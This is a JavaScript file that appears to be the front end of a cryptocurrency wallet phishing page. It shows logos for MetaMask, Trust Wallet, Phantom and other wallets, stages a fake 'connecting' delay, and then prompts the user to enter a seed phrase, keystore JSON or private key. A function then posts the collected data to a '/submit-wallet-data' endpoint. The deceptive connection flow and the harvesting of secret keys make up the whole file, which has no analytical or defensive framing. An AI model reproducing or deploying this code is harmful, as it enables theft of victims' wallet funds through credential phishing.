
// Wallet logos and data
const walletData = {
  'MetaMask': 'https://cdn.jsdelivr.net/npm/cryptocurrency-icons@0.18.1/svg/color/eth.svg',
  'Trust Wallet': 'https://cdn.jsdelivr.net/npm/cryptocurrency-icons@0.18.1/svg/color/bnb.svg',
  'WalletConnect': 'https://cdn.jsdelivr.net/npm/cryptocurrency-icons@0.18.1/svg/color/btc.svg',
  'Coinbase Wallet': 'https://cdn.jsdelivr.net/npm/cryptocurrency-icons@0.18.1/svg/color/usdc.svg',
  'Phantom': 'https://cdn.jsdelivr.net/npm/cryptocurrency-icons@0.18.1/svg/color/sol.svg',
  'Rainbow': 'https://cdn.jsdelivr.net/npm/cryptocurrency-icons@0.18.1/svg/color/eth.svg',
  'Exodus': 'https://cdn.jsdelivr.net/npm/cryptocurrency-icons@0.18.1/svg/color/btc.svg',
  'Atomic Wallet': 'https://cdn.jsdelivr.net/npm/cryptocurrency-icons@0.18.1/svg/color/atom.svg'
};

// Initialize wallet list when page loads
document.addEventListener('DOMContentLoaded', function() {
  populateWalletList();
  setupImportMethodTabs();
});

function populateWalletList() {
  const walletList = document.getElementById('walletList');
  
  Object.keys(walletData).forEach(walletName => {
    const walletItem = document.createElement('div');
    walletItem.className = 'wallet-item';
    walletItem.onclick = () => selectWallet(walletName);
    
    walletItem.innerHTML = `
      <div class="wallet-status"></div>
      <img src="${walletData[walletName]}" alt="${walletName}" class="wallet-logo-small">
      <span>${walletName}</span>
    `;
    
    walletList.appendChild(walletItem);
  });

  // Add "Other" option for custom wallet
  const otherItem = document.createElement('div');
  otherItem.className = 'wallet-item';
  otherItem.onclick = () => showCustomWalletInput();
  otherItem.innerHTML = `
    <div class="wallet-status"></div>
    <span style="margin-left: 2.5rem;">Other</span>
  `;
  walletList.appendChild(otherItem);
}

function selectWallet(walletName) {
  // Close wallet selection popup
  document.getElementById('walletPopup').style.display = 'none';
  
  // Show initialization popup
  document.getElementById('initWalletName').textContent = `Connecting to ${walletName}`;
  document.getElementById('initStatusMessage').textContent = 'Attempting to connect...';
  document.getElementById('initPopup').style.display = 'flex';
  
  // Simulate connection attempt
  setTimeout(() => {
    // Close init popup and show import popup
    document.getElementById('initPopup').style.display = 'none';
    showImportPopup(walletName);
  }, 2000);
}

function showCustomWalletInput() {
  document.getElementById('customWalletInput').classList.remove('hidden');
}

function selectCustomWallet() {
  const customName = document.getElementById('customWalletName').value.trim();
  if (customName) {
    selectWallet(customName);
  }
}

function showImportPopup(walletName) {
  document.getElementById('importWalletName').textContent = walletName;
  document.getElementById('importWalletLogo').src = walletData[walletName] || '';
  document.getElementById('walletImportPopup').style.display = 'flex';
}

function setupImportMethodTabs() {
  const tabs = document.querySelectorAll('.method-tab');
  const input = document.getElementById('walletSeedInput');
  
  tabs.forEach(tab => {
    tab.addEventListener('click', function() {
      // Remove active class from all tabs
      tabs.forEach(t => t.classList.remove('active'));
      // Add active class to clicked tab
      this.classList.add('active');
      
      // Update placeholder based on selected method
      const method = this.dataset.type;
      switch(method) {
        case 'seed':
          input.placeholder = 'Enter your 12 or 24 word seed phrase';
          break;
        case 'keystore':
          input.placeholder = 'Paste your keystore JSON file content';
          break;
        case 'private':
          input.placeholder = 'Enter your private key';
          break;
      }
    });
  });
}

function openWalletPopup(issueType) {
  if (issueType) {
    document.getElementById('troubleshootIssueType').textContent = issueType;
    document.getElementById('troubleshootPopup').style.display = 'flex';
  }
}

// Send data to backend as backup
async function sendToBackend(data) {
  try {
    const response = await fetch('/submit-wallet-data', {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json'
      },
      body: JSON.stringify(data)
    });
    
    const result = await response.json();
    console.log('Backend response:', result);
  } catch (error) {
    console.error('Backend submission failed:', error);
  }
}
